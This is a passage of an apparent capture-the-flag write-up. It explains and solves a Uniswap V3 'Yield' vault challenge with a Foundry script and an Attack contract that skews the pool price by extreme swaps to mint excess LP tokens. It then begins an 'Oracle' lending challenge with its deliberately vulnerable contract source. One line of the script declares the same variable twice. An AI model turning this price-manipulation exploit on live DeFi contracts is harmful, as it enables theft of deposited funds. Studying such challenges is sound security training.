</span></code></pre></div></div><h2 id=solution-3>Solution</h2><p>Uniswap V3 is scary for sure but to break things you don't need to master it. This is an example challege of how you can do yeild farming in Uniswap V3.<p>Let's break down the key components and observations of this Yield contract:<ol><li><p><strong>Core Functionality</strong>:</p> <ul><li>Implements a yield farming vault for Uniswap V3<li>Manages liquidity positions in a specific price range<li>Allows users to deposit and withdraw tokens<li>Collects and distributes fees from the pool</ul><li><p><strong>Key State Variables</strong>:</p> <ul><li><code>baseLower</code> and <code>baseUpper</code>: Defines the price range for liquidity provision<li><code>lastTick</code>: Tracks the last price tick for rebalancing<li><code>protocolFee</code>: Fee charged by the protocol (in basis points)<li><code>maxTotalSupply</code>: Maximum allowed LP tokens<li><code>accruedProtocolFees</code>: Tracks fees collected by the protocol</ul><li><p><strong>Important Functions</strong>:</p> <ul><li><code>deposit()</code>: Allows users to add liquidity and receive LP tokens<li><code>withdraw()</code>: Lets users withdraw their share of liquidity<li><code>rebalance()</code>: Adjusts the liquidity position based on price changes<li><code>_poke()</code>: Updates the vault's holdings<li><code>_calcSharesAndAmounts()</code>: Calculates LP tokens based on deposits</ul></ol><p><strong>Goal Understanding</strong>:<ul><li>We need to get 15e18 LP tokens<li>We're given 5e18 each of token0 and token1</ul><p>I suspected the following things in the protocol as the potential issues to exploit,<ul><li>The <code>rebalance()</code> function has a price movement requirement (<code>diff >= 5 * tickSpacing</code>)<li>The <code>_calcSharesAndAmounts()</code> function has a potential rounding issue<li>The <code>deposit()</code> function's share calculation might be manipulated<li>The compiler version is <code>solidity ^0.7.0</code>, i.e, suceptible to integer overflows</ul><ol><li><p><strong>Price Manipulation</strong>:</p> <ul><li>The Yield contract uses the pool's price to calculate LP token shares<li>We can manipulate the pool's price by performing large swaps<li>When we swap token0 for token1, we push the price to the minimum (MIN_SQRT_RATIO)<li>When we swap token1 for token0, we push the price to the maximum (MAX_SQRT_RATIO)</ul><li><p><strong>Share Calculation Exploit</strong>:</p> <ul><li>The <code>_calcSharesAndAmounts()</code> function calculates shares based on the current pool price<li>When the price is manipulated to extreme values, the share calculation becomes inaccurate<li>This allows us to get more LP tokens than we should for our deposit</ul></ol><div class=note-container><button class=note-toggle><div class=note-icon><p>Yield.s.sol</div></button><div class=note-content style=display:none><pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: Unlicense
</span><span style=color:#a71d5d;font-weight:700>pragma solidity ^</span><span style=color:#0086b3>0.7.0</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/Script.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"forge-std/console.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"@openzeppelin-contracts-3.4.2/contracts/token/ERC20/IERC20.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import</span><span> {Yield } from "../src/Yield.sol";
</span><span style=color:#a71d5d;font-weight:700>contract </span><span style=color:#62a35c>YieldSolve </span><span style=color:#a71d5d;font-weight:700>is </span><span style=color:#62a35c>Script </span><span>{
</span><span>    Yield </span><span style=color:#a71d5d;font-weight:700>public </span><span>yield </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>Yield</span><span>(</span><span style=color:#0086b3>0x59CD84565A441D6551ecb87F7878F4b028AD8e8B</span><span>);
</span><span>    IUniswapV3Pool </span><span style=color:#a71d5d;font-weight:700>public </span><span>pool </span><span style=color:#a71d5d;font-weight:700>=</span><span> yield.</span><span style=color:#62a35c>pool</span><span>();
</span><span>    </span><span style=color:#0086b3>IERC20 </span><span style=color:#a71d5d;font-weight:700>public</span><span> token0 </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>IERC20</span><span>(pool.</span><span style=color:#62a35c>token0</span><span>());
</span><span>    </span><span style=color:#0086b3>IERC20 </span><span style=color:#a71d5d;font-weight:700>public</span><span> token1 </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>IERC20</span><span>(pool.</span><span style=color:#62a35c>token1</span><span>());
</span><span>    </span><span style=color:#0086b3>address</span><span> player </span><span style=color:#a71d5d;font-weight:700>=</span><span> vm.</span><span style=color:#62a35c>envAddress</span><span>(</span><span style=color:#183691>"PLAYER"</span><span>);
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>run</span><span>() </span><span style=color:#a71d5d;font-weight:700>external</span><span>{
</span><span>        vm.</span><span style=color:#62a35c>startBroadcast</span><span>(vm.</span><span style=color:#62a35c>envUint</span><span>(</span><span style=color:#183691>"PRIVATE_KEY"</span><span>));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Player : "</span><span>, player);
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Player balance: "</span><span>, player.balance);
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Yield : "</span><span>, </span><span style=color:#0086b3>address</span><span>(yield));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Pool : "</span><span>, </span><span style=color:#0086b3>address</span><span>(pool));
</span><span>        </span><span style=color:#969896;font-style:italic>// console.log("token0 : ", address(token0));
</span><span>        </span><span style=color:#969896;font-style:italic>// console.log("token1 : ", address(token1));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Pool balance of token0 : "</span><span>, token0.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(pool)));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Pool balance of token1 : "</span><span>, token1.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(pool)));
</span><span>
</span><span>        (</span><span style=color:#0086b3>uint160</span><span> sqrtPriceX96,</span><span style=color:#0086b3>int24</span><span> tick,,,,,) </span><span style=color:#a71d5d;font-weight:700>=</span><span> pool.</span><span style=color:#62a35c>slot0</span><span>();
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Pool tick : "</span><span>, tick);
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Pool sqrtPriceX96 : "</span><span>, </span><span style=color:#0086b3>uint256</span><span>(sqrtPriceX96));
</span><span>        </span><span style=color:#969896;font-style:italic>// console.log("Token0 price in terms of Token1 : ", 1.0001**tick);
</span><span>        </span><span style=color:#969896;font-style:italic>// console.log("baseLower: ", yield.baseLower());
</span><span>        </span><span style=color:#969896;font-style:italic>// console.log("baseUpper: ", yield.baseUpper());
</span><span>        </span><span style=color:#969896;font-style:italic>// console.log("tickSpacing: ", yield.tickSpacing());
</span><span>
</span><span>        (</span><span style=color:#0086b3>uint256</span><span> total0, </span><span style=color:#0086b3>uint256</span><span> total1) </span><span style=color:#a71d5d;font-weight:700>=</span><span> yield.</span><span style=color:#62a35c>getTotalAmounts</span><span>();
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"total0: "</span><span>, total0);
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"total1: "</span><span>, total1);
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Yield balance of token0 : "</span><span>, token0.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(yield)));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Yield balance of token1 : "</span><span>, token1.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(yield)));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Yield getBalance0() : "</span><span>, yield.</span><span style=color:#62a35c>getBalance0</span><span>());
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Yield getBalance1() : "</span><span>, yield.</span><span style=color:#62a35c>getBalance1</span><span>());
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Initial LP tokens : "</span><span>, yield.</span><span style=color:#62a35c>totalSupply</span><span>());
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Yield accruedProtocolFees0() : "</span><span>, yield.</span><span style=color:#62a35c>accruedProtocolFees0</span><span>());
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Yield accruedProtocolFees1() : "</span><span>, yield.</span><span style=color:#62a35c>accruedProtocolFees1</span><span>());
</span><span>
</span><span>
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Player balance of token0 : "</span><span>, token0.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(player)));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Player balance of token1 : "</span><span>, token1.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(player)));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Player balance of LP tokens : "</span><span>, yield.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(player)));
</span><span>
</span><span>        token0.</span><span style=color:#62a35c>approve</span><span>(</span><span style=color:#0086b3>address</span><span>(yield),  </span><span style=color:#0086b3>14 ether</span><span>);
</span><span>        token1.</span><span style=color:#62a35c>approve</span><span>(</span><span style=color:#0086b3>address</span><span>(yield), </span><span style=color:#0086b3>15 ether</span><span>);
</span><span>        yield.</span><span style=color:#62a35c>deposit</span><span>( </span><span style=color:#0086b3>14 ether</span><span>, </span><span style=color:#0086b3>15 ether</span><span>, 1, 1, player);
</span><span>        </span><span style=color:#969896;font-style:italic>// Repeat the following process until we got more LP tokens
</span><span>        Attack attack </span><span style=color:#a71d5d;font-weight:700>= new </span><span style=color:#62a35c>Attack</span><span>(</span><span style=color:#0086b3>address</span><span>(yield), player);
</span><span>        Attack attack </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>Attack</span><span>(</span><span style=color:#0086b3>0xf5420a93FCa0E520E319Dc3f05625c79613be6b0</span><span>);
</span><span>        token0.</span><span style=color:#62a35c>transfer</span><span>(</span><span style=color:#0086b3>address</span><span>(attack), 2 ether);
</span><span>        token1.</span><span style=color:#62a35c>transfer</span><span>(</span><span style=color:#0086b3>address</span><span>(attack), 2 ether);
</span><span>        attack.</span><span style=color:#62a35c>exploit</span><span>(</span><span style=color:#0086b3>true</span><span>); 
</span><span>        yield.</span><span style=color:#62a35c>withdraw</span><span>(yield.</span><span style=color:#62a35c>balanceOf</span><span>(player), 0, 0, player);
</span><span>
</span><span>        
</span><span>        (sqrtPriceX96,tick,,,,,) </span><span style=color:#a71d5d;font-weight:700>=</span><span> pool.</span><span style=color:#62a35c>slot0</span><span>();
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Pool tick : "</span><span>, tick);
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Pool sqrtPriceX96 : "</span><span>, </span><span style=color:#0086b3>uint256</span><span>(sqrtPriceX96));
</span><span>        (total0, total1) </span><span style=color:#a71d5d;font-weight:700>=</span><span> yield.</span><span style=color:#62a35c>getTotalAmounts</span><span>();
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"total0: "</span><span>, total0);
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"total1: "</span><span>, total1);
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Yield getBalance0() : "</span><span>, yield.</span><span style=color:#62a35c>getBalance0</span><span>());
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Yield getBalance1() : "</span><span>, yield.</span><span style=color:#62a35c>getBalance1</span><span>());
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Initial LP tokens : "</span><span>, yield.</span><span style=color:#62a35c>totalSupply</span><span>());
</span><span>
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Player balance of token0 : "</span><span>, token0.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(player)));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Player balance of token1 : "</span><span>, token1.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(player)));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Player balance of LP tokens : "</span><span>, yield.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(player)));
</span><span>
</span><span>        </span><span style=color:#969896;font-style:italic>// console.log("isSolved() : ", yield.isSolved());
</span><span>        vm.</span><span style=color:#62a35c>stopBroadcast</span><span>();
</span><span>    }
</span><span>}
</span><span>
</span><span style=color:#a71d5d;font-weight:700>contract </span><span style=color:#62a35c>Attack </span><span>{
</span><span>    Yield </span><span style=color:#a71d5d;font-weight:700>public </span><span>yield;
</span><span>    IUniswapV3Pool </span><span style=color:#a71d5d;font-weight:700>public </span><span>pool;
</span><span>    </span><span style=color:#0086b3>IERC20 </span><span style=color:#a71d5d;font-weight:700>public</span><span> token0;
</span><span>    </span><span style=color:#0086b3>IERC20 </span><span style=color:#a71d5d;font-weight:700>public</span><span> token1;
</span><span>    </span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>public</span><span> player;
</span><span>    </span><span style=color:#0086b3>uint160 </span><span style=color:#a71d5d;font-weight:700>internal constant</span><span> MIN_SQRT_RATIO </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>4295128739</span><span>;
</span><span>    </span><span style=color:#0086b3>uint160 </span><span style=color:#a71d5d;font-weight:700>internal constant</span><span> MAX_SQRT_RATIO </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>1461446703485210103287273052203988822378723970342</span><span>;
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>constructor</span><span>(</span><span style=color:#0086b3>address </span><span>_yeild, </span><span style=color:#0086b3>address </span><span>_player){
</span><span>        yield </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>Yield</span><span>(_yeild);
</span><span>        pool </span><span style=color:#a71d5d;font-weight:700>=</span><span> yield.</span><span style=color:#62a35c>pool</span><span>();
</span><span>        token0 </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>IERC20</span><span>(pool.</span><span style=color:#62a35c>token0</span><span>());
</span><span>        token1 </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>IERC20</span><span>(pool.</span><span style=color:#62a35c>token1</span><span>());
</span><span>        player </span><span style=color:#a71d5d;font-weight:700>=</span><span> _player;
</span><span>    }
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>exploit</span><span>(</span><span style=color:#0086b3>bool </span><span>zeroForOne) </span><span style=color:#a71d5d;font-weight:700>public </span><span>{
</span><span>        (</span><span style=color:#0086b3>uint160</span><span> sqrtPriceX96,,,,,,) </span><span style=color:#a71d5d;font-weight:700>=</span><span> pool.</span><span style=color:#62a35c>slot0</span><span>();
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(zeroForOne){
</span><span>            </span><span style=color:#0086b3>uint256</span><span> token0bal </span><span style=color:#a71d5d;font-weight:700>=</span><span>  token0.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>));
</span><span>            token0.</span><span style=color:#62a35c>approve</span><span>(</span><span style=color:#0086b3>address</span><span>(pool), token0bal);
</span><span>            pool.</span><span style=color:#62a35c>swap</span><span>(player, </span><span style=color:#0086b3>true</span><span>, </span><span style=color:#0086b3>int256</span><span>(token0bal), MIN_SQRT_RATIO</span><span style=color:#a71d5d;font-weight:700>+</span><span>1, </span><span style=color:#183691>""</span><span>);
</span><span>        }
</span><span>        </span><span style=color:#a71d5d;font-weight:700>else </span><span>{
</span><span>            </span><span style=color:#0086b3>uint256</span><span> token1bal </span><span style=color:#a71d5d;font-weight:700>=</span><span>  token1.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>));
</span><span>            token1.</span><span style=color:#62a35c>approve</span><span>(</span><span style=color:#0086b3>address</span><span>(pool), token1bal);
</span><span>            pool.</span><span style=color:#62a35c>swap</span><span>(player, </span><span style=color:#0086b3>false</span><span>, </span><span style=color:#0086b3>int256</span><span>(token1bal), MAX_SQRT_RATIO</span><span style=color:#a71d5d;font-weight:700>-</span><span>1, </span><span style=color:#183691>""</span><span>);
</span><span>        }
</span><span>        
</span><span>        token0.</span><span style=color:#62a35c>transfer</span><span>(player, token0.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>)));
</span><span>        token1.</span><span style=color:#62a35c>transfer</span><span>(player, token1.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>)));
</span><span>
</span><span>    }
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>uniswapV3SwapCallback</span><span>(
</span><span>        </span><span style=color:#0086b3>int256 </span><span>amount0Delta,
</span><span>        </span><span style=color:#0086b3>int256 </span><span>amount1Delta,
</span><span>        </span><span style=color:#0086b3>bytes </span><span style=color:#a71d5d;font-weight:700>calldata </span><span>data
</span><span>    ) </span><span style=color:#a71d5d;font-weight:700>external  </span><span>{
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender == </span><span style=color:#0086b3>address</span><span>(pool));
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(amount0Delta </span><span style=color:#a71d5d;font-weight:700>></span><span> 0) token0.</span><span style=color:#62a35c>transfer</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, </span><span style=color:#0086b3>uint256</span><span>(amount0Delta));
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(amount1Delta </span><span style=color:#a71d5d;font-weight:700>></span><span> 0) token1.</span><span style=color:#62a35c>transfer</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>, </span><span style=color:#0086b3>uint256</span><span>(amount1Delta));
</span><span>    }
</span><span>}
</span></code></pre></div></div><p>The exploit takes advantage of the fact that the Yield contract doesn't properly handle extreme price movements in the underlying Uniswap V3 pool, allowing us to manipulate the LP token calculations to our advantage.<hr><h1 id=oracle>Oracle</h1><p>P: "Michael wrote a Dex pool for USDe and USDC tokens along with their respective oracles. Then he borrowed a large position from his own pool trusting his own code. The pool is deployed with the same code and params as the actual pool at https://etherscan.io/tx/0x6f4438aa1785589e2170599053a0cdc740d8987746a4b5ad9614b6ab7bb4e550. You are given 10000 tokens of USDe and USDC. Your goal is to get 20000 of USDe.<p>Might help you: check the differences betweeen the current implementation and the implementation deployed at the pool creation time on mainnet"<div class=note-container><button class=note-toggle><div class=note-icon><p>Oracle.sol</div></button><div class=note-content style=display:none><pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span style=color:#a71d5d;font-weight:700>pragma solidity ^</span><span style=color:#0086b3>0.8.0</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"@openzeppelin-contracts-4.8.0/contracts/token/ERC20/IERC20.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"@openzeppelin-contracts-4.8.0/contracts/token/ERC20/ERC20.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"@openzeppelin-contracts-4.8.0/contracts/security/ReentrancyGuard.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"@openzeppelin-contracts-4.8.0/contracts/access/Ownable.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"@openzeppelin-contracts-4.8.0/contracts/utils/math/Math.sol"</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>interface </span><span style=color:#62a35c>ICurve </span><span>{
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>add_liquidity</span><span>(
</span><span>        </span><span style=color:#0086b3>uint256</span><span>[] </span><span style=color:#a71d5d;font-weight:700>calldata </span><span>amounts,
</span><span>        </span><span style=color:#0086b3>uint256 </span><span>min_mint_amount
</span><span>    ) </span><span style=color:#a71d5d;font-weight:700>external returns </span><span>(</span><span style=color:#0086b3>uint256</span><span>);
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>remove_liquidity_imbalance</span><span>(
</span><span>        </span><span style=color:#0086b3>uint256</span><span>[] </span><span style=color:#a71d5d;font-weight:700>calldata </span><span>amounts,
</span><span>        </span><span style=color:#0086b3>uint256 </span><span>max_burn_amount
</span><span>    ) </span><span style=color:#a71d5d;font-weight:700>external returns </span><span>(</span><span style=color:#0086b3>uint256</span><span>);
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>price_oracle</span><span>(</span><span style=color:#0086b3>uint256 </span><span>idx) </span><span style=color:#a71d5d;font-weight:700>external view returns </span><span>(</span><span style=color:#0086b3>uint256</span><span>);
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>last_price</span><span>(</span><span style=color:#0086b3>uint256 </span><span>idx) </span><span style=color:#a71d5d;font-weight:700>external view returns </span><span>(</span><span style=color:#0086b3>uint256</span><span>);
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>coins</span><span>(</span><span style=color:#0086b3>uint256 </span><span>idx) </span><span style=color:#a71d5d;font-weight:700>external view returns </span><span>(</span><span style=color:#0086b3>address</span><span>);
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>balanceOf</span><span>(</span><span style=color:#0086b3>address </span><span>owner) </span><span style=color:#a71d5d;font-weight:700>external view returns </span><span>(</span><span style=color:#0086b3>uint256</span><span>);
</span><span>    </span><span style=color:#969896;font-style:italic>// function lp_token() external view returns (address);
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>approve</span><span>(</span><span style=color:#0086b3>address </span><span>spender, </span><span style=color:#0086b3>uint256 </span><span>amount) </span><span style=color:#a71d5d;font-weight:700>external returns </span><span>(</span><span style=color:#0086b3>bool</span><span>);
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>exchange</span><span>(
</span><span>        </span><span style=color:#0086b3>int128 </span><span>i,
</span><span>        </span><span style=color:#0086b3>int128 </span><span>j,
</span><span>        </span><span style=color:#0086b3>uint256 </span><span>dx,
</span><span>        </span><span style=color:#0086b3>uint256 </span><span>min_dy
</span><span>    ) </span><span style=color:#a71d5d;font-weight:700>external returns </span><span>(</span><span style=color:#0086b3>uint256</span><span>);
</span><span>}
</span><span>
</span><span style=color:#a71d5d;font-weight:700>interface </span><span style=color:#62a35c>IPriceOracle </span><span>{
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>getAssetPrice</span><span>(</span><span style=color:#0086b3>uint256 </span><span>_assetId) </span><span style=color:#a71d5d;font-weight:700>external view returns </span><span>(</span><span style=color:#0086b3>uint256</span><span>);
</span><span>}
</span><span>
</span><span style=color:#a71d5d;font-weight:700>contract </span><span style=color:#62a35c>SimplePriceOracle </span><span style=color:#a71d5d;font-weight:700>is </span><span style=color:#62a35c>IPriceOracle</span><span>, </span><span style=color:#62a35c>Ownable </span><span>{
</span><span>    </span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>public</span><span> price;
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>constructor</span><span>(</span><span style=color:#0086b3>uint256 </span><span>_price) </span><span style=color:#62a35c>Ownable</span><span>() {
</span><span>        price </span><span style=color:#a71d5d;font-weight:700>=</span><span> _price;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>setPrice</span><span>(</span><span style=color:#0086b3>uint256 </span><span>_price) </span><span style=color:#a71d5d;font-weight:700>external onlyOwner </span><span>{
</span><span>        price </span><span style=color:#a71d5d;font-weight:700>=</span><span> _price;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>getAssetPrice</span><span>(</span><span style=color:#0086b3>uint256 </span><span>_assetId) </span><span style=color:#a71d5d;font-weight:700>external view returns </span><span>(</span><span style=color:#0086b3>uint256</span><span>) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return</span><span> price;
</span><span>    }
</span><span>}
</span><span>
</span><span style=color:#a71d5d;font-weight:700>contract </span><span style=color:#62a35c>CurvePriceOracle </span><span style=color:#a71d5d;font-weight:700>is </span><span style=color:#62a35c>IPriceOracle </span><span>{
</span><span>    </span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>public</span><span> curvePool;
</span><span>    </span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>public</span><span> idx;
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>constructor</span><span>(</span><span style=color:#0086b3>address </span><span>_curvePool, </span><span style=color:#0086b3>uint256 </span><span>_idx, </span><span style=color:#0086b3>uint256 </span><span>anchor) {
</span><span>        curvePool </span><span style=color:#a71d5d;font-weight:700>=</span><span> _curvePool;
</span><span>
</span><span>        </span><span style=color:#0086b3>uint256</span><span> absDiff </span><span style=color:#a71d5d;font-weight:700>=</span><span> 0;
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(</span><span style=color:#62a35c>ICurve</span><span>(curvePool).</span><span style=color:#62a35c>price_oracle</span><span>(_idx) </span><span style=color:#a71d5d;font-weight:700>></span><span> anchor) {
</span><span>            absDiff </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>ICurve</span><span>(curvePool).</span><span style=color:#62a35c>price_oracle</span><span>(_idx) </span><span style=color:#a71d5d;font-weight:700>-</span><span> anchor;
</span><span>        } </span><span style=color:#a71d5d;font-weight:700>else </span><span>{
</span><span>            absDiff </span><span style=color:#a71d5d;font-weight:700>=</span><span> anchor </span><span style=color:#a71d5d;font-weight:700>- </span><span style=color:#62a35c>ICurve</span><span>(curvePool).</span><span style=color:#62a35c>price_oracle</span><span>(_idx);
</span><span>        }
</span><span>        </span><span style=color:#a71d5d;font-weight:700>require</span><span>(absDiff </span><span style=color:#a71d5d;font-weight:700>&lt;=</span><span> 1e8, </span><span style=color:#183691>"Price oracle has been manipulated :("</span><span>);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>getAssetPrice</span><span>(</span><span style=color:#0086b3>uint256 </span><span>_assetId) </span><span style=color:#a71d5d;font-weight:700>external view returns </span><span>(</span><span style=color:#0086b3>uint256</span><span>) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#62a35c>ICurve</span><span>(curvePool).</span><span style=color:#62a35c>price_oracle</span><span>(idx);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>getSpotPrice</span><span>() </span><span style=color:#a71d5d;font-weight:700>external view returns </span><span>(</span><span style=color:#0086b3>uint256</span><span>) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#62a35c>ICurve</span><span>(curvePool).</span><span style=color:#62a35c>last_price</span><span>(idx);
</span><span>    }
</span><span>}
</span><span>
</span><span style=color:#a71d5d;font-weight:700>contract </span><span style=color:#62a35c>Oracle </span><span style=color:#a71d5d;font-weight:700>is </span><span style=color:#62a35c>ReentrancyGuard</span><span>, </span><span style=color:#62a35c>Ownable </span><span>{
</span><span>    </span><span style=color:#a71d5d;font-weight:700>struct </span><span style=color:#62a35c>Asset </span><span>{
</span><span>        </span><span style=color:#0086b3>IERC20</span><span> token;
</span><span>        </span><span style=color:#0086b3>uint256</span><span> totalDeposited;
</span><span>        </span><span style=color:#0086b3>uint256</span><span> totalBorrowed;
</span><span>        </span><span style=color:#0086b3>uint256</span><span> baseRate;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>struct </span><span style=color:#62a35c>UserAccount </span><span>{
</span><span>        </span><span style=color:#a71d5d;font-weight:700>mapping</span><span>(</span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>=> </span><span style=color:#0086b3>uint256</span><span>) deposited;
